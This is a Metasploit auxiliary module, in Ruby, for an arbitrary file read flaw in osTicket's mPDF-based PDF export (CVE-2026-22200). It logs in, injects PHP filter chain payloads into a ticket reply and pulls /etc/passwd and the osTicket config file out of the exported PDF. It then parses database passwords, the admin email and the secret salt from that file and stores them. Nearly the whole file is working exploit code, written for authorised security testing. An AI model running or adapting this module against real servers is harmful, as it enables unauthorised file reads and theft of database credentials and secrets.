##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Osticket

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'osTicket Arbitrary File Read via PHP Filter Chains in mPDF',
        'Description' => %q{
          This module exploits an arbitrary file read vulnerability in osTicket
          (CVE-2026-22200). The vulnerability exists in osTicket's PDF export
          functionality which uses mPDF. By injecting a specially crafted HTML payload
          containing PHP filter chain URIs into a ticket reply, an attacker can read
          arbitrary files from the server when the ticket is exported to PDF.

          The PHP filter chain constructs a BMP image header that is prepended to the
          target file contents. When mPDF renders the ticket as a PDF, it processes
          the php://filter URI, reads the target file, and embeds it as a bitmap image
          in the resulting PDF. The module then extracts the file contents from the PDF.

          Authentication is required. The module supports both staff panel (/scp/) and
          client portal login. An existing ticket number is also required.

          Default files extracted are /etc/passwd and include/ost-config.php. The
          osTicket config file contains database credentials and the SECRET_SALT value.
        },
        'Author' => [
          'HORIZON3.ai Team',                    # Vulnerability discovery and PoC
          'Arkaprabha Chakraborty <@t1nt1nsn0wy>' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-22200'],
          ['URL', 'https://horizon3.ai/attack-research/attack-blogs/ticket-to-shell-exploiting-php-filters-and-cnext-in-osticket-cve-2026-22200'],
          ['URL', 'https://github.com/horizon3ai/CVE-2026-22200/tree/main']
        ],
        'DisclosureDate' => '2026-01-13',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        },
      )
    )

    register_options(
        [ 
            OptString.new('TARGETURI', [true, 'Base path to osTicket installation', '/']),
            OptString.new('USERNAME', [true, 'osTicket username or email address']),
            OptString.new('PASSWORD', [true, 'osTicket password']),
            OptString.new('TICKET_NUMBER', [true, 'Ticket number to use for payload injection (e.g. 978554)']),
            OptString.new('TICKET_ID', [false, 'Internal ticket ID (auto-detected if not set)']),
            OptEnum.new('LOGIN_PORTAL', [true, 'Login portal to use', 'auto', ['auto', 'scp', 'client']]),
            OptString.new('FILES', [
                true,
                'Comma-separated list of files to read. Append :b64 or :b64zlib for encoding (e.g. /proc/self/maps:b64zlib)',
                '/etc/passwd,include/ost-config.php'
            ]),
            OptBool.new('STORE_LOOT', [false, 'Store extracted files as loot', true]),
            OptInt.new('MAX_REDIRECTS', [false, 'Maximum number of HTTP redirect hops to follow', 3]),
            OptInt.new('MAX_TICKET_ID', [false, 'Upper bound for brute-force ticket ID search', 20])
        ]
    )
  end

  def target_uri
    datastore['TARGETURI']
  end

  def check
    auto_set_vhost
    check_uri = normalize_uri(target_uri)
    print_status("check: Sending GET to #{check_uri} (RHOST=#{rhost}, RPORT=#{rport}, SSL=#{datastore['SSL']}, VHOST=#{datastore['VHOST']})")
    begin
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => check_uri
      )
    rescue ::Rex::ConnectionError, ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Errno::ETIMEDOUT => e
      print_error("check: Connection error: #{e.class} - #{e.message}")
      return Exploit::CheckCode::Unknown("Could not connect to target: #{e.message}")
    end

    unless res
      print_error("check: send_request_cgi returned nil (no response / timeout)")
      return Exploit::CheckCode::Unknown('Could not connect to target (nil response)')
    end

    print_status("check: Got response code=#{res.code}, Content-Type=#{res.headers['Content-Type']}, body=#{res.body.to_s.length} bytes")

    # Follow 301/302 redirects (e.g. / -> /index.php)
    redirect_limit = datastore['MAX_REDIRECTS']
    prev_location = nil
    while [301, 302].include?(res.code) && redirect_limit > 0
      location = res.headers['Location']
      break unless location

      print_status("check: Location header: #{location}")

      # Detect redirect loop (same Location repeated)
      if location == prev_location
        print_warning("check: Redirect loop detected, stopping")
        break
      end
      prev_location = location

      if location.start_with?('http')
        parsed = URI.parse(location)
        redirect_uri = parsed.path.empty? ? '/' : parsed.path
        # If redirecting to a different host, set VHOST
        if parsed.host && parsed.host != rhost && datastore['VHOST'].to_s.empty?
          print_status("check: Redirect points to #{parsed.host}, setting VHOST")
          datastore['VHOST'] = parsed.host
        end
        # If redirecting to HTTPS or a different port, update connection parameters
        url_ssl = parsed.scheme.downcase == 'https'
        if datastore['SSL'] != url_ssl
          datastore['SSL'] = url_ssl
          disconnect
          print_status("check: Switched SSL=#{url_ssl} based on redirect")
        end
        if parsed.port != datastore['RPORT']
          datastore['RPORT'] = parsed.port
          disconnect
          print_status("check: Switched RPORT=#{parsed.port} based on redirect")
        end
      else
        redirect_uri = location
      end

      print_status("check: Following #{res.code} redirect to #{redirect_uri}")
      res = send_request_cgi('method' => 'GET', 'uri' => redirect_uri)
      break unless res

      redirect_limit -= 1
    end

    unless is_osticket?(res)
      return Exploit::CheckCode::Safe('Target does not appear to be an osTicket installation')
    end

    Exploit::CheckCode::Detected('Target appears to be an osTicket installation')
  end

  def run
    auto_set_vhost
    base_uri = target_uri
    file_specs = parse_file_specs(datastore['FILES'])

    if file_specs.empty?
      fail_with(Failure::BadConfig, 'No files specified in FILES option')
    end

    print_status("Target: #{rhost}:#{rport}")
    print_status("Files to extract: #{file_specs.map { |f| f[:path] }.join(', ')}")

    # Step 1: Login
    print_status('Attempting authentication...')
    portal, cookies = do_login(base_uri)
    if portal.nil?
      fail_with(Failure::NoAccess, "Login failed with #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
    end
    prefix = portal == 'scp' ? '/scp' : ''
    print_good("Authenticated via #{portal} portal")

    # Step 2: Resolve ticket ID
    print_status('Locating ticket...')
    ticket_id = resolve_ticket_id(base_uri, prefix, cookies)
    if ticket_id.nil?
      fail_with(Failure::NotFound, "Could not find internal ID for ticket ##{datastore['TICKET_NUMBER']}. Try setting TICKET_ID manually.")
    end
    print_good("Ticket ##{datastore['TICKET_NUMBER']} has internal ID: #{ticket_id}")

    # Step 3: Generate and submit payload
    print_status('Generating PHP filter chain payload...')
    payload_html = generate_ticket_payload(
      file_specs.map { |f| f[:encoding] == 'plain' ? f[:path] : "#{f[:path]},#{f[:encoding]}" },
      true # is_reply
    )
    print_status("Payload generated (#{payload_html.length} bytes for #{file_specs.length} file(s))")

    print_status('Submitting payload as ticket reply...')
    reply_ok = submit_ticket_reply(base_uri, prefix, ticket_id, payload_html, cookies)
    if reply_ok
      print_good('Reply posted successfully')
    else
      print_warning('Reply submission did not return expected confirmation. Continuing to PDF download...')
    end

    # Step 4: Download PDF and extract
    print_status('Downloading ticket PDF...')
    pdf_data = download_ticket_pdf(base_uri, prefix, ticket_id, cookies, datastore['MAX_REDIRECTS'] || 3)
    if pdf_data.nil?
      fail_with(Failure::UnexpectedReply, 'Failed to download PDF export')
    end
    print_good("PDF downloaded (#{pdf_data.length} bytes)")

    # Step 5: Extract files from PDF
    print_status('Extracting files from PDF...')
    extracted = extract_files_from_pdf(pdf_data)
    if extracted.empty?
      print_error('No files could be extracted from the PDF')
      if datastore['STORE_LOOT']
        path = store_loot('osticket.pdf', 'application/pdf', rhost, pdf_data, 'ticket.pdf', 'Raw PDF export')
        print_status("Raw PDF saved as loot: #{path}")
      end
      return
    end
    print_good("Extracted #{extracted.length} file(s) from PDF")

    # Step 6: Display and store results
    print_line
    print_line('=' * 70)
    print_line('EXTRACTED FILE CONTENTS')
    print_line('=' * 70)

    extracted.each_with_index do |content, i|
      file_label = i < file_specs.length ? file_specs[i][:path] : "file_#{i + 1}"
      safe_name = file_label.split(',').first.tr('/', '_').sub(/\A_+/, '')

      print_line
      print_line("--- [#{file_label}] (#{content.length} bytes) ---")

      begin
        text = content.encode('UTF-8', 'binary', invalid: :replace, undef: :replace, replace: '')
        text.sub!(/[\x00-\x08\x0e-\x1f].*\z/m, '') # Strip trailing BMP padding artifacts
        if text.length > 3000
          print_line(text[0, 3000])
          print_line("\n... (truncated)")
        else
          print_line(text)
        end
      rescue EncodingError
        print_line('[Binary data]')
      end

      next unless datastore['STORE_LOOT']

      path = store_loot(
        "osticket.#{safe_name}",
        'application/octet-stream',
        rhost,
        content,
        safe_name,
        "File read from osTicket server: #{file_label}"
      )
      print_good("Saved to: #{path}")
    end

    # Look for key secrets in ost-config.php
    report_secrets(extracted)

    print_line
    print_good('Exploitation complete')
  end

  private

  
  def auto_set_vhost
    rhosts_val = datastore['RHOSTS'].to_s
    return unless rhosts_val.match?(%r{\Ahttps?://}i)

    parsed = URI.parse(rhosts_val)
    return unless parsed.host

    # VHOST: set hostname for Host header if it differs from resolved IP
    if datastore['VHOST'].to_s.empty? && parsed.host != rhost
      datastore['VHOST'] = parsed.host
      print_status("Auto-set VHOST=#{parsed.host} from RHOSTS URL")
    end

    # RPORT: derive from URL (explicit port or scheme default)
    url_port = parsed.port # URI.parse returns 80/443 as defaults for http/https
    if url_port && url_port != datastore['RPORT']
      datastore['RPORT'] = url_port
      print_status("Auto-set RPORT=#{url_port} from RHOSTS URL")
    end

    # SSL: derive from scheme
    url_ssl = parsed.scheme.downcase == 'https'
    if datastore['SSL'] != url_ssl
      datastore['SSL'] = url_ssl
      print_status("Auto-set SSL=#{url_ssl} from RHOSTS URL")
    end
  end

  # Parses the FILES datastore option into an array of { path:, encoding: } hashes.
  def parse_file_specs(files_str)
    files_str.split(',').map(&:strip).reject(&:empty?).map do |spec|
      if spec.include?(':')
        path, enc = spec.split(':', 2)
        enc = 'plain' unless %w[plain b64 b64zlib].include?(enc)
      else
        path = spec
        enc = 'plain'
      end
      { path: path, encoding: enc }
    end
  end

  # Attempts login via the configured portal (auto tries SCP first, then client).
  # Returns [portal_type, cookies] or [nil, nil].
  def do_login(base_uri)
    portal_pref = datastore['LOGIN_PORTAL']
    print_status("do_login: portal preference=#{portal_pref}, base_uri=#{base_uri}, username=#{datastore['USERNAME']}")

    if portal_pref == 'auto' || portal_pref == 'scp'
      print_status('do_login: Trying staff panel (/scp/) login...')
      cookies = osticket_login_scp(base_uri, datastore['USERNAME'], datastore['PASSWORD'])
      if cookies
        print_good("do_login: SCP login succeeded, cookies=#{cookies}")
        return ['scp', cookies]
      end
      print_status('do_login: Staff panel login failed') if portal_pref == 'auto'
    end

    if portal_pref == 'auto' || portal_pref == 'client'
      print_status('do_login: Trying client portal login...')
      cookies = osticket_login_client(base_uri, datastore['USERNAME'], datastore['PASSWORD'])
      if cookies
        print_good("do_login: Client portal login succeeded, cookies=#{cookies}")
        return ['client', cookies]
      end
      print_status('do_login: Client portal login failed')
    end

    print_error('do_login: All login attempts failed')
    [nil, nil]
  end

  # Resolves the internal ticket ID from the user-provided ticket number or datastore override.
  def resolve_ticket_id(base_uri, prefix, cookies)
    if datastore['TICKET_ID'] && !datastore['TICKET_ID'].empty?
      print_status("resolve_ticket_id: Using manually set TICKET_ID=#{datastore['TICKET_ID']}")
      return datastore['TICKET_ID']
    end

    find_ticket_id(base_uri, prefix, datastore['TICKET_NUMBER'], cookies, datastore['MAX_TICKET_ID'] || 20)
  end

  # Searches extracted file contents for osTicket configuration secrets and reports them.
  def report_secrets(extracted)
    secret_patterns = {
      'SECRET_SALT' => /define\('SECRET_SALT','([^']+)'\)/,
      'ADMIN_EMAIL' => /define\('ADMIN_EMAIL','([^']+)'\)/,
      'DBHOST' => /define\('DBHOST','([^']+)'\)/,
      'DBNAME' => /define\('DBNAME','([^']+)'\)/,
      'DBUSER' => /define\('DBUSER','([^']+)'\)/,
      'DBPASS' => /define\('DBPASS','([^']+)'\)/
    }

    found_any = false

    extracted.each do |content|
      text = content.encode('UTF-8', 'binary', invalid: :replace, undef: :replace, replace: '') rescue next

      secret_patterns.each do |key, pattern|
        match = text.match(pattern)
        next unless match

        unless found_any
          print_line
          print_line('=' * 70)
          print_line('KEY FINDINGS')
          print_line('=' * 70)
          found_any = true
        end
        print_good("  #{key}: #{match[1]}")

        # Report credentials to the database
        case key
        when 'DBUSER'
          # Will be paired with DBPASS below
        when 'DBPASS'
          db_user_match = text.match(/define\('DBUSER','([^']+)'\)/)
          if db_user_match
            report_cred(db_user_match[1], match[1], 'osTicket database')
          end
        when 'ADMIN_EMAIL'
          report_note(
            host: rhost,
            port: rport,
            type: 'osticket.admin_email',
            data: { email: match[1] }
          )
        when 'SECRET_SALT'
          report_note(
            host: rhost,
            port: rport,
            type: 'osticket.secret_salt',
            data: { salt: match[1] }
          )
        end
      end
    end
  end

  # Reports a credential pair to the Metasploit database.
  def report_cred(username, password, service_name)
    credential_data = {
      module_fullname: fullname,
      workspace_id: myworkspace_id,
      origin_type: :service,
      address: rhost,
      port: rport,
      protocol: 'tcp',
      service_name: service_name,
      username: username,
      private_data: password,
      private_type: :password
    }
    create_credential(credential_data)
  rescue StandardError => e
    vprint_error("Failed to store credential: #{e}")
  end
end